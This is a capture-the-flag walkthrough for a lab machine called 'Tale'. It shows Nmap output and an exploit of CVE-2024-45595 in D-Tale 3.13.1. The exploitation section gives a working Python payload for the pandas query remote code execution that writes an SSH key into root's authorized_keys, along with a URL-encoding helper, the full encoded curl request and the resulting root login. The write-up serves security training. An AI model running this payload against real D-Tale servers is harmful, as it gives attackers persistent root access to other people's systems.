# Tale Walkthrough

## Enumeration

Nmap scan

```
┌──(vagrant㉿kali)-[~/ugc/tale]
└─$ nmap -Pn -sC -sV -oN scan.txt 192.168.215.129
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 05:48 EDT
Nmap scan report for 192.168.215.129
Host is up (0.0010s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9c:a8:af:f5:d5:3e:c0:f2:8f:ef:fc:d6:05:4e:dd:ff (RSA)
|   256 85:9a:fd:d3:8e:cd:e7:32:aa:87:c0:76:80:8e:be:63 (ECDSA)
|_  256 4a:49:ea:5a:27:87:0f:69:a1:7d:57:0f:0a:9f:ea:4c (ED25519)
MAC Address: 00:0C:29:59:DC:12 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
```

```
┌──(vagrant㉿kali)-[~/ugc/tale]
└─$ nmap -Pn -sC -sV -oN scan.txt 192.168.215.129 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 05:53 EDT
Nmap scan report for 192.168.215.129
Host is up (0.00086s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9c:a8:af:f5:d5:3e:c0:f2:8f:ef:fc:d6:05:4e:dd:ff (RSA)
|   256 85:9a:fd:d3:8e:cd:e7:32:aa:87:c0:76:80:8e:be:63 (ECDSA)
|_  256 4a:49:ea:5a:27:87:0f:69:a1:7d:57:0f:0a:9f:ea:4c (ED25519)
40000/tcp open  safetynetp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/3.0.4 Python/3.8.10
|     Date: Mon, 07 Oct 2024 09:55:33 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 213
|     Location: /dtale/main/1
|     Vary: Accept-Encoding
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="/dtale/main/1">/dtale/main/1</a>. If not, click the link.
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.4 Python/3.8.10
|     Date: Mon, 07 Oct 2024 09:55:33 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Vary: Accept-Encoding
|     Content-Length: 0
|     Connection: close
|   Help:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port40000-TCP:V=7.94SVN%I=7%D=10/7%Time=6703B015%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,1B6,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/3\.0
SF:\.4\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2007\x20Oct\x202024\x2009:55:3
SF:3\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Len
SF:gth:\x20213\r\nLocation:\x20/dtale/main/1\r\nVary:\x20Accept-Encoding\r
SF:\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<t
SF:itle>Redirecting\.\.\.</title>\n<h1>Redirecting\.\.\.</h1>\n<p>You\x20s
SF:hould\x20be\x20redirected\x20automatically\x20to\x20the\x20target\x20UR
SF:L:\x20<a\x20href=\"/dtale/main/1\">/dtale/main/1</a>\.\x20If\x20not,\x2
SF:0click\x20the\x20link\.\n")%r(HTTPOptions,DE,"HTTP/1\.1\x20200\x20OK\r\
SF:nServer:\x20Werkzeug/3\.0\.4\x20Python/3\.8\.10\r\nDate:\x20Mon,\x2007\
SF:x20Oct\x202024\x2009:55:33\x20GMT\r\nContent-Type:\x20text/html;\x20cha
SF:rset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nVary:\x20Accept-Enc
SF:oding\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPR
SF:equest,1F4,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.
SF:01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html
SF:4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;
SF:charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20respo
SF:nse</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTP
SF:Status\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupport
SF:ed\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(Help,1EF,"<!
SF:DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\
SF:">\n<html>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<me
SF:ta\x20http-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\
SF:">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\
SF:x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p
SF:>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:
SF:\x20Bad\x20request\x20syntax\x20\('HELP'\)\.</p>\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\
SF:x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n
SF:\x20\x20\x20\x20</body>\n</html>\n");
MAC Address: 00:0C:29:59:DC:12 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.21 seconds
```

During the initial Nmap scan, only port 22 (SSH) appeared open. However, after conducting a full port scan, we discovered that port 40000 (HTTP) was also open. Further enumeration revealed the application running on this port was D-Tale version 3.13.1 (as seen on the "About" page). Researching known vulnerabilities for this version, we identified [CVE-2024-45595](https://www.cve.org/CVERecord?id=CVE-2024-45595), which could potentially be exploited.

> D-Tale is a visualizer for Pandas data structures. Users hosting D-Tale publicly can be vulnerable to remote code execution allowing attackers to run malicious code on the server. Users should upgrade to version 3.14.1 where the "Custom Filter" input is turned off by default.

## Exploitation

Leveraging the Proof-of-Concept (PoC) from the following references, [Snyk Security Advisory](https://security.snyk.io/vuln/SNYK-PYTHON-DTALE-7926878) and [Unauthenticated Remote Command Execution via Panda df.query](https://rumbling-slice-eb0.notion.site/Unauthenticated-Remote-Command-Execution-via-Panda-df-query-9dc40f0477ee4b65806de7921876c222?pvs=4), we adapted the exploit to insert our SSH key into the root user's authorized keys, enabling persistent access.

```python
@pd.core.frame.com.builtins.__import__("os").system(""" echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGVrsbqi33eEjUFHmuflO6exRWcNHtz3bRl9hbYPEBOA vagrant@kali' >> /root/.ssh/authorized_keys #""")
```

We then URL-encoded the modified payload, ensuring that every character, including safe characters, was encoded to maintain proper formatting and execution.

```
import urllib.parse

def url_encode_all(input_string):
    return ''.join('%{:02X}'.format(ord(char)) for char in input_string)

if __name__ == "__main__":
    # Example input
    input_string = input("Enter the string to URL-encode: ")
    
    # Encode the string
    encoded_string = url_encode_all(input_string)
    
    print(f"Encoded string: {encoded_string}")

```

```
┌──(vagrant㉿kali)-[~/ugc/tale]
└─$ python3 url_encode.py
Enter the string to URL-encode: @pd.core.frame.com.builtins.__import__("os").system(""" echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGVrsbqi33eEjUFHmuflO6exRWcNHtz3bRl9hbYPEBOA vagrant@kali' >> /root/.ssh/authorized_keys #""")
Encoded string: %40%70%64%2E%63%6F%72%65%2E%66%72%61%6D%65%2E%63%6F%6D%2E%62%75%69%6C%74%69%6E%73%2E%5F%5F%69%6D%70%6F%72%74%5F%5F%28%22%6F%73%22%29%2E%73%79%73%74%65%6D%28%22%22%22%20%65%63%68%6F%20%27%73%73%68%2D%65%64%32%35%35%31%39%20%41%41%41%41%43%33%4E%7A%61%43%31%6C%5A%44%49%31%4E%54%45%35%41%41%41%41%49%47%56%72%73%62%71%69%33%33%65%45%6A%55%46%48%6D%75%66%6C%4F%36%65%78%52%57%63%4E%48%74%7A%33%62%52%6C%39%68%62%59%50%45%42%4F%41%20%76%61%67%72%61%6E%74%40%6B%61%6C%69%27%20%3E%3E%20%2F%72%6F%6F%74%2F%2E%73%73%68%2F%61%75%74%68%6F%72%69%7A%65%64%5F%6B%65%79%73%20%23%22%22%22%29
```

Next, start a listener on your attacker machine, and execute the following HTTP GET request:

```
curl -X GET 'http://192.168.215.129:40000/dtale/chart-data/1?query=%40%70%64%2E%63%6F%72%65%2E%66%72%61%6D%65%2E%63%6F%6D%2E%62%75%69%6C%74%69%6E%73%2E%5F%5F%69%6D%70%6F%72%74%5F%5F%28%22%6F%73%22%29%2E%73%79%73%74%65%6D%28%22%22%22%20%65%63%68%6F%20%27%73%73%68%2D%65%64%32%35%35%31%39%20%41%41%41%41%43%33%4E%7A%61%43%31%6C%5A%44%49%31%4E%54%45%35%41%41%41%41%49%47%56%72%73%62%71%69%33%33%65%45%6A%55%46%48%6D%75%66%6C%4F%36%65%78%52%57%63%4E%48%74%7A%33%62%52%6C%39%68%62%59%50%45%42%4F%41%20%76%61%67%72%61%6E%74%40%6B%61%6C%69%27%20%3E%3E%20%2F%72%6F%6F%74%2F%2E%73%73%68%2F%61%75%74%68%6F%72%69%7A%65%64%5F%6B%65%79%73%20%23%22%22%22%29'
```

Afterward, log in as root via SSH using the previously added SSH key for authentication.

```
┌──(vagrant㉿kali)-[~/ugc/tale]
└─$ ssh root@192.168.215.129
The authenticity of host '192.168.215.129 (192.168.215.129)' can't be established.
ED25519 key fingerprint is SHA256:fVKoeT0zGvb4WekUMMffwF+dEvlEmxBb/mLstI7ZTKI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.215.129' (ED25519) to the list of known hosts.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@tale:~# whoami
root
root@tale:~# id
uid=0(root) gid=0(root) groups=0(root)
root@tale:~# cat proof.txt
23f...cd4
root@tale:~#
```

## Escalation

None